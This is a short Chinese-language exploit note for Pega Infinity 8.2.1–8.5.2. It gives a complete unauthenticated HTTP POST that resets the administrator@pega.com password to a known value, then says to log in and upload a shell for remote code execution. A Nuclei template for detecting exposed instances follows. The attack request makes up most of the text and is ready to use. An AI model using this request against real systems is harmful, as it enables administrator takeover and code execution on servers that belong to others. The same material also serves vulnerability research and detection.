影響版本
--------

    Pega Infinity > = 8.2.1
    Pega Infinity <= 8.5.2

漏洞利用
--------

1.訪問任何實例登錄頁面，使用"administrator@pega.com"進行重置密碼進行登錄,PoC如下，重置密碼為：Rules@1234進行登錄後上傳shell進行rce。

    POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
    Host: redacted.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 112
    Origin: https://redacted.com
    DNT: 1
    Connection: close
    Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
    Cookie: yourCookie
    Upgrade-Insecure-Requests: 1

    pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword=

Nuclei Template：

    id: pega

    info:
      name: Pega Infinity Login
      author: sshell
      severity: low

    requests:
      - method: GET
        path:
          - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
        headers:
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
        matchers:
          - type: word
            words:
              - "Pega API"